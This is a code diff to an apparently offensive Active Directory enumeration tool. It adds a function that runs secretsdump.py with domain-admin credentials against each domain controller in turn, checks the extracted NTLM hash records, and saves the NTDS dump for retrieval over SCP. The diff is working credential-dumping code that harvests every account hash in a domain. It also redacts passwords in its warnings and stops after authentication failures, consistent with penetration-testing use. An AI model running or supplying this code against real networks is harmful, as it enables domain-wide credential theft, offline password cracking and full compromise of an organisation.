@@ -34,6 +34,101 @@ def _new_artefacts(
     return sorted(path for path, state in after.items() if before.get(path) != state)
 
 
+def _dump_ntds(
+    domain: str,
+    username: str,
+    password: str,
+    dc_ips: list[str],
+    output_dir: Path,
+) -> tuple[Path, str] | None:
+    """Try each DC with an isolated secretsdump output directory."""
+    record = re.compile(
+        r"[^:\r\n]+:\d+:[0-9a-f]{32}:[0-9a-f]{32}:::"
+        r"(?:\s+\(status=(?:Enabled|Disabled|N/A)\))?",
+        re.IGNORECASE,
+    )
+    auth_errors = (
+        "STATUS_LOGON_FAILURE", "STATUS_WRONG_PASSWORD", "STATUS_ACCOUNT_LOCKED_OUT",
+        "STATUS_ACCOUNT_DISABLED", "STATUS_ACCOUNT_RESTRICTION", "STATUS_PASSWORD_EXPIRED",
+        "STATUS_PASSWORD_MUST_CHANGE", "STATUS_NO_SUCH_USER", "KDC_ERR_PREAUTH_FAILED",
+        "KDC_ERR_CLIENT_REVOKED", "KDC_ERR_C_PRINCIPAL_UNKNOWN", "LOGON FAILURE",
+        "ACCOUNT LOCKED",
+    )
+
+    for dc_ip in dict.fromkeys(dc_ips):
+        print_info(f"Attempting NTDS dump from {dc_ip}.")
+        with tempfile.TemporaryDirectory(dir=output_dir.resolve(), prefix=".ntds-") as directory:
+            attempt_dir = Path(directory)
+            try:
+                with progress("[cyan]Running secretsdump..."):
+                    result = subprocess.run(
+                        [
+                            "secretsdump.py",
+                            f"{domain}/{username}:{password}@{dc_ip}",
+                            "-user-status",
+                            "-just-dc-ntlm",
+                            "-outputfile",
+                            domain,
+                        ],
+                        cwd=attempt_dir,
+                        capture_output=True,
+                        text=True,
+                    )
+            except OSError as exc:
+                print_error(f"Unable to start secretsdump: {exc}")
+                return None
+
+            output = result.stdout + "\n" + result.stderr
+            diagnostics = [
+                line.strip() for line in output.splitlines()
+                if re.match(r"^\s*(?:\[-\]|\[!\]|ERROR:|CRITICAL:)", line, re.IGNORECASE)
+            ]
+            if not diagnostics and result.returncode and result.stderr.strip():
+                diagnostics = [result.stderr.strip().splitlines()[-1]]
+            attempt_file = attempt_dir / f"{domain}.ntds"
+            valid_records = False
+            if attempt_file.is_file():
+                try:
+                    with attempt_file.open(encoding="utf-8") as dump:
+                        for line in dump:
+                            line = line.strip()
+                            if not line:
+                                continue
+                            if not record.fullmatch(line):
+                                valid_records = False
+                                break
+                            valid_records = True
+                except (OSError, UnicodeError) as exc:
+                    print_warning(f"Unable to read NTDS dump from {dc_ip}: {exc}")
+                    valid_records = False
+
+            incomplete = any(attempt_dir.glob("sessionresume_*"))
+            if result.returncode == 0 and not diagnostics and not incomplete and valid_records:
+                destination = output_dir / attempt_file.name
+                attempt_file.replace(destination)
+                return destination, dc_ip
+
+            print_warning(f"NTDS dump from {dc_ip} did not complete.")
+            if diagnostics:
+                for line in diagnostics:
+                    if password:
+                        line = line.replace(password, "[REDACTED]")
+                    line = re.sub(r"\b[0-9a-f]{32}\b", "[REDACTED]", line, flags=re.IGNORECASE)
+                    print_warning(line)
+            elif result.returncode:
+                print_warning(f"secretsdump exited with code {result.returncode}.")
+            elif incomplete:
+                print_warning("secretsdump left an incomplete resume file.")
+            else:
+                print_warning("No valid NTDS hash records were produced.")
+
+            if any(error in output.upper() for error in auth_errors):
+                print_error("Authentication failure detected; not trying additional DCs.")
+                return None
+
+    return None
+
+
 # TODO: Automate domain and DC resolution
 def identify_domain_controller(
     dc_ip: str,
@@ -442,7 +537,11 @@ def print_summary(
 
     table.add_row(
         "NTDS Dump",
-        ("Completed" if session_data["ntds_dumped"] else "Skipped"),
+        (
+            "Completed" if session_data["ntds_dumped"]
+            else "Failed" if session_data.get("ntds_attempted")
+            else "Skipped"
+        ),
     )
 
     console.print(table)
@@ -690,6 +789,7 @@ def run_enumeration() -> None:
             "rusthound_collected": False,
 
             "ntds_dumped": False,
+            "ntds_attempted": False,
 
         }
 
@@ -785,42 +885,21 @@ def run_enumeration() -> None:
 
             else:
                 output_dir = get_artefacts_dir()
-                before = (
-                    _artefact_snapshot(output_dir, f"{domain}.ntds*")
-                    if generate_scp_retrieval else {}
+                session_data["ntds_attempted"] = True
+                dumped = _dump_ntds(
+                    domain, da_user, da_pass,
+                    [dc_ip, *dc_ips], output_dir,
                 )
-
-                with progress("[cyan]Running secretsdump..."):
-
-                    result = subprocess.run(
-                        [
-                            "secretsdump.py",
-                            (
-                                f"{domain}/"
-                                f"{da_user}:"
-                                f"{da_pass}@"
-                                f"{dc_ip}"
-                            ),
-                            "-user-status",
-                            "-just-dc-ntlm",
-                            "-outputfile",
-                            domain,
-                        ],
-                        cwd=output_dir,
-                        capture_output=True,
-                        text=True,
-                    )
-
-                if result.returncode == 0:
+                if dumped:
+                    output_file, dump_dc = dumped
                     session_data["ntds_dumped"] = True
+                    session_data["ntds_dc"] = dump_dc
                     if generate_scp_retrieval:
-                        collected = _new_artefacts(output_dir, f"{domain}.ntds*", before)
-                        if not collected:
-                            print_warning("No new or updated NTDS files were found for retrieval.")
-                        retrieval_files.extend(collected)
-                    print_success("NTDS dump completed.")
+                        retrieval_files.append(output_file)
+                    print_success(f"NTDS dump completed using {dump_dc}.")
                 else:
-                    print_error("NTDS dump failed.")
+                    print_error("NTDS dump failed; no complete dump was collected.")
+                save_session(session_data)
 
         #-----------------------------------------------------------------------
         # SCP COMMAND & SUMMARY TABLE
